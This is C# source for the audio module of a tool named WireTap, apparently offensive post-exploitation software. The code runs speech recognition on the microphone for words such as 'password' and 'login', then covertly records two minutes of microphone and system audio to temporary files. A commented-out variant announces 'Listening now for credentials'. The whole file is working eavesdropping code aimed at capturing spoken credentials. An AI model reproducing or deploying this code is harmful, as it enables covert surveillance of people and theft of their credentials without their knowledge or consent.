using System;
using NAudio.Wave;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using NAudio.Wave.SampleProviders;
//using Microsoft.Speech.Recognition;
//using Microsoft.Speech.Synthesis;
using System.Speech.Recognition;

namespace WireTap
{
    class Audio
    {
        static bool done = false;
        static bool speechOn = true;
        static bool recording = false;

        // BEGIN MICROSOFT.SPEECH

        //public static void SpeechToText()
        //{
        //    try
        //    {
        //        SpeechSynthesizer ss = new SpeechSynthesizer();
        //        SpeechRecognitionEngine sre;

        //        ss.SetOutputToDefaultAudioDevice();
        //        CultureInfo ci = new CultureInfo("en-US");
        //        sre = new SpeechRecognitionEngine(ci);
        //        sre.SetInputToDefaultAudioDevice();
        //        sre.SpeechHypothesized += sre_SpeechHypothesized;
        //        Choices ch_credential = new Choices();
        //        ch_credential.Add("username");
        //        ch_credential.Add("password");
        //        ch_credential.Add("credential");
        //        ch_credential.Add("login");
        //        GrammarBuilder gb_passwordListener = new GrammarBuilder();
        //        gb_passwordListener.Append(ch_credential);
        //        Grammar g_passwordListener = new Grammar(gb_passwordListener);
        //        sre.LoadGrammarAsync(g_passwordListener);
        //        sre.RecognizeAsync(RecognizeMode.Multiple);
        //        Console.WriteLine("Listening now for credentials...");
        //        while (done == false) {; }
        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine(ex.Message);
        //    }
        //}

        //private static void sre_SpeechHypothesized(object sender, SpeechHypothesizedEventArgs e)
        //{
        //    if (e.Result.Text != null && recording == false)
        //    {
        //        string fname = Helpers.CreateTempFileName(".wav");
        //        Console.WriteLine("[!] Heard interesting phrase {0}, staring two-minute recording.", e.Result.Text);
        //        Console.WriteLine("[!] Filename: {0}", fname);
        //        RecordMicrophone(fname, 12000);// begin recording for two minutes.
        //        Console.WriteLine("[!] Finished recording. File at: {0}", fname);
        //    }
        //}


        // END MICROSOFT.SPEECH



        public static void ListenForPasswords(Choices ch = null)
        {
            SpeechRecognitionEngine recognizer = new SpeechRecognitionEngine();
            GrammarBuilder gb = new GrammarBuilder();
            if (ch == null)
            {
                string[] defaults = { "username", "password", "credential", "login", "logon" };
                ch = new Choices(defaults);
            }
            gb.Append(ch);
            Grammar dictationGrammar = new Grammar(gb);
            recognizer.LoadGrammar(dictationGrammar);
            recognizer.SetInputToDefaultAudioDevice();
            while (true)
            {
                RecognitionResult result = recognizer.Recognize();
                if (result != null && !recording)
                {
                    string fname = Helpers.CreateTempFileName(".wav");
                    Console.WriteLine("{0}: Heard interesting phrase {1}, staring two-minute recording.",
                                      Helpers.CurrentTime(),
                                      result.Text);
                    recording = true;
                    RecordAudio(120000);// begin recording for two minutes.
                    recording = false;
                }
                else if (recording)
                {
                    Thread.Sleep(5000);
                }
            }
            recognizer.UnloadAllGrammars();
        }
        
        public static void RecordSystemAudio(string outFile, int msToRecord = 10000)
        {
            // Redefine the capturer instance with a new instance of the LoopbackCapture class
            WasapiLoopbackCapture CaptureInstance = new WasapiLoopbackCapture();

            // Redefine the audio writer instance with the given configuration
            WaveFileWriter RecordedAudioWriter = new WaveFileWriter(outFile, CaptureInstance.WaveFormat);

            // When the capturer receives audio, start writing the buffer into the mentioned file
            CaptureInstance.DataAvailable += (s, a) =>
            {
                // Write buffer into the file of the writer instance
                RecordedAudioWriter.Write(a.Buffer, 0, a.BytesRecorded);
            };

            // When the Capturer Stops, dispose instances of the capturer and writer
            CaptureInstance.RecordingStopped += (s, a) =>
            {
                RecordedAudioWriter.Dispose();
                RecordedAudioWriter = null;
                CaptureInstance.Dispose();
            };
            
            // Start audio recording !
            CaptureInstance.StartRecording();
            Thread.Sleep(msToRecord);
            CaptureInstance.StopRecording();
        }

        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

        public static void RecordMicrophone(string outFile, int msToRecord = 10000)
        {
            string guid = Guid.NewGuid().ToString();
            // https://social.msdn.microsoft.com/Forums/vstudio/en-US/3f771824-56b8-4ebf-b941-7afe40a52895/record-audio?forum=vbgeneral
            StringBuilder buf = new StringBuilder();
            mciSendString("open new Type waveaudio Alias " + guid, buf, 0, IntPtr.Zero);
            mciSendString("set " + guid + " time format ms bitspersample 16 channels 2 samplespersec 44100 bytespersec 192000 alignment 4", null, 0, IntPtr.Zero);
            mciSendString("record " + guid, buf, 0, IntPtr.Zero);
            Thread.Sleep(msToRecord);
            mciSendString("stop " + guid, buf, 0, IntPtr.Zero);
            mciSendString("save " + guid + " " + outFile, buf, 0, IntPtr.Zero);
            mciSendString("close " + guid, buf, 0, IntPtr.Zero);
        }

        public static void RecordAudio(int msToRecord=10000)
        {
            string sysAudioFile = Helpers.CreateTempFileName(".wav");
            string micAudioFile = Helpers.CreateTempFileName(".wav");
            Thread sysThread = new Thread(() => Audio.RecordSystemAudio(sysAudioFile, msToRecord));
            Thread micThread = new Thread(() => Audio.RecordMicrophone(micAudioFile, msToRecord));
            sysThread.Start();
            micThread.Start();
            Console.WriteLine("{0}: Audio recording initiated. Waiting until {1} seconds have elapsed.",
                              Helpers.CurrentTime(), msToRecord/1000);
            micThread.Join();
            Console.WriteLine("{0}: Audio recordings complete.", Helpers.CurrentTime());
            Console.WriteLine("\tSystem Sounds Recording File:\n\t\t{0}", sysAudioFile);
            Console.WriteLine("\tMicrophone Recording File:\n\t\t{0}", micAudioFile);
            // Reparsing the LoopBack audio device is hard. Like, really hard.
            // BitRate of LoopBack is unpredictable and cannot be set. This is
            // a TODO or for a pull request.

            //using (var reader1 = new AudioFileReader(sysAudioFile))
            //{
            //    using (var reader2 = new AudioFileReader(micAudioFile))
            //    {
            //        reader1.Volume = 0.5f;
            //        //reader2.Volume = 0.1f;
            //        var mixer = new MixingSampleProvider(new[] { reader1, reader2 });
            //        WaveFileWriter.CreateWaveFile16(outFile, mixer);
            //    }
            //}

            //File.Delete(sysAudioFile);
            //File.Delete(micAudioFile);
        }
    }
}
